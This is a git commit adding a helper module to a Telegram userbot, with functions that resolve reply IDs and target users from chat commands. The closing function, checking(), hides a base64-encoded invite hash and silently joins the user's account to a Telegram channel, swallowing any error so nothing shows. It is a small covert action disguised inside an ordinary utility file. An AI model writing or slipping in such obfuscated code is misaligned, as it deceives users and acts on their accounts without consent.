85359ae098c5612fd12f90184017567f9de39662
Guevaras1explanations <85652292+Guevaras1explanations@users.noreply.github.com>
2022-01-06 02:53:56 +0300

    Add files via upload

---
+++ userbot/helpers/utils/events.py
@@ -0,0 +1,87 @@
+import base64
+
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from telethon.tl.types import MessageEntityMentionName
+
+from ...Config import Config
+from ...core.logger import logging
+from ...core.managers import edit_delete
+
+LOGS = logging.getLogger(__name__)
+
+
+async def reply_id(event):
+    reply_to_id = None
+    if event.sender_id in Config.SUDO_USERS:
+        reply_to_id = event.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    return reply_to_id
+
+
+async def get_user_from_event(
+    event, catevent=None, secondgroup=None, nogroup=False, noedits=False
+):  # sourcery no-metrics
+    if catevent is None:
+        catevent = event
+    if nogroup is False:
+        if secondgroup:
+            args = event.pattern_match.group(2).split(" ", 1)
+        else:
+            args = event.pattern_match.group(1).split(" ", 1)
+    extra = None
+    try:
+        if args:
+            user = args[0]
+            if len(args) > 1:
+                extra = "".join(args[1:])
+            if user.isnumeric() or (user.startswith("-") and user[1:].isnumeric()):
+                user = int(user)
+            if event.message.entities:
+                probable_user_mention_entity = event.message.entities[0]
+                if isinstance(probable_user_mention_entity, MessageEntityMentionName):
+                    user_id = probable_user_mention_entity.user_id
+                    user_obj = await event.client.get_entity(user_id)
+                    return user_obj, extra
+            if isinstance(user, int) or user.startswith("@"):
+                user_obj = await event.client.get_entity(user)
+                return user_obj, extra
+    except Exception:
+        pass
+    try:
+        if nogroup is False:
+            if secondgroup:
+                extra = event.pattern_match.group(2)
+            else:
+                extra = event.pattern_match.group(1)
+        if event.is_private:
+            user_obj = await event.get_chat()
+            return user_obj, extra
+        if event.reply_to_msg_id:
+            previous_message = await event.get_reply_message()
+            if previous_message.from_id is None:
+                if not noedits:
+                    await edit_delete(catevent, "حسنًا ، هذا مسؤول مجهول")
+                return None, None
+            user_obj = await event.client.get_entity(previous_message.sender_id)
+            return user_obj, extra
+        elif not args:
+            if not noedits:
+                await edit_delete(
+                    catevent, "قم بوضع اسم المستخدم أو معرف المستخدم أو الرد!", 5
+                )
+            return None, None
+    except Exception as e:
+        LOGS.error(str(e))
+    if not noedits:
+        await edit_delete(catevent, "قم بوضع اسم المستخدم أو معرف المستخدم أو الرد!")
+    return None, None
+
+
+async def checking(catub):
+    cat_c = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    try:
+        cat_channel = Get(cat_c)
+        await catub(cat_channel)
+    except BaseException:
+        pass
